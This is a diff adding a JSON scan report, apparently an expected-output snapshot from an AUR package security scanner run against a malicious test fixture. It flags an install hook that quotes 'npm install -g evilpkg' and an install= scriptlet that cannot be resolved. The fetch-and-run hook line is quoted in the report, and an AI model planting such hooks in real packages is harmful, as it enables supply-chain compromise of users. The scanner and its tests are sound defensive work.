@@ -1,0 +1,87 @@
+{
+  "package_name": "demo",
+  "package_version": "1-1",
+  "findings": [
+    {
+      "id": "SCAN-001",
+      "severity": "critical",
+      "category": "configuration",
+      "title": "Package file could not be analyzed: demo",
+      "description": "'tests/fixtures/malicious/install-plus-eq/demo' is declared by install= but does not exist; makepkg would refuse it, and the declared scriptlet could not be reviewed. Content that was not analyzed cannot be reported clean; a payload can hide behind exactly this.",
+      "location": {
+        "file": "tests/fixtures/malicious/install-plus-eq/demo",
+        "line": null,
+        "column": null,
+        "snippet": null
+      },
+      "recommendation": "Do not install. Inspect the file by hand; a legitimate package has no reason to ship an oversized, unreadable, or symlinked script.",
+      "cwe_id": "CWE-693",
+      "metadata": {
+        "path": "tests/fixtures/malicious/install-plus-eq/demo",
+        "reason": "is declared by install= but does not exist; makepkg would refuse it, and the declared scriptlet could not be reviewed"
+      }
+    },
+    {
+      "id": "ATOMIC-002",
+      "severity": "critical",
+      "category": "malicious_code",
+      "title": "Node/Bun package manager in install hook (install script)",
+      "description": "Invokes npm/pnpm/yarn/bun (or the npx/bunx runners) to install or run packages from an install hook. The June 2026 'Atomic Arch' campaign added post-install hooks running `npm install atomic-lockfile` / `bun install js-digest`. Legitimate packages never fetch or execute npm/bun packages during the install phase. `npm ci`, `npm rebuild`, `npm exec`, `pnpm dlx`, `yarn dlx`, and the bare `npx <pkg>` / `bunx <pkg>` runners all fetch-and-run lifecycle/remote code just like `install`.",
+      "location": {
+        "file": "tests/fixtures/malicious/install-plus-eq/demo.scr",
+        "line": 2,
+        "column": 3,
+        "snippet": "  npm install -g evilpkg"
+      },
+      "recommendation": "Install scripts must never fetch or install npm/bun packages. Inspect the PKGBUILD diff and report the package to the AUR maintainers.",
+      "cwe_id": "CWE-494",
+      "metadata": {
+        "in_install_script": true,
+        "matched_text": "npm install",
+        "script_kind": "install script"
+      }
+    },
+    {
+      "id": "META-007",
+      "severity": "high",
+      "category": "suspicious_metadata",
+      "title": "install= cannot be statically resolved",
+      "description": "The install scriptlet name is not a plain value the scanner can resolve (install modified by += / [i]= / read / printf -v). makepkg runs whichever file it names as the package's install scriptlet, so every file beside the PKGBUILD was scanned as a possible scriptlet.",
+      "location": {
+        "file": "tests/fixtures/malicious/install-plus-eq/PKGBUILD",
+        "line": null,
+        "column": null,
+        "snippet": "install=install modified by += / [i]= / read / printf -v"
+      },
+      "recommendation": "Do not install. Use a literal `install=<pkgname>.install` and review the file it names.",
+      "cwe_id": "CWE-426",
+      "metadata": {
+        "values": [
+          "install modified by += / [i]= / read / printf -v"
+        ]
+      }
+    },
+    {
+      "id": "META-005",
+      "severity": "medium",
+      "category": "suspicious_metadata",
+      "title": "install= points outside the package",
+      "description": "install=demo is not a plain `<name>.install` file in the package directory (it contains a path, `..`, or a non-.install name). makepkg runs this scriptlet as part of the package; an out-of-tree path is a way to run an unexpected file.",
+      "location": {
+        "file": "tests/fixtures/malicious/install-plus-eq/PKGBUILD",
+        "line": null,
+        "column": null,
+        "snippet": "install=demo"
+      },
+      "recommendation": "Use a plain `<pkgname>.install` file shipped alongside the PKGBUILD.",
+      "cwe_id": "CWE-426",
+      "metadata": {}
+    }
+  ],
+  "scanned_files": [
+    "tests/fixtures/malicious/install-plus-eq/PKGBUILD",
+    "tests/fixtures/malicious/install-plus-eq/demo.scr"
+  ],
+  "timestamp": "2026-11-10T14:50:59.770639961Z",
+  "scan_duration_ms": 18
+}
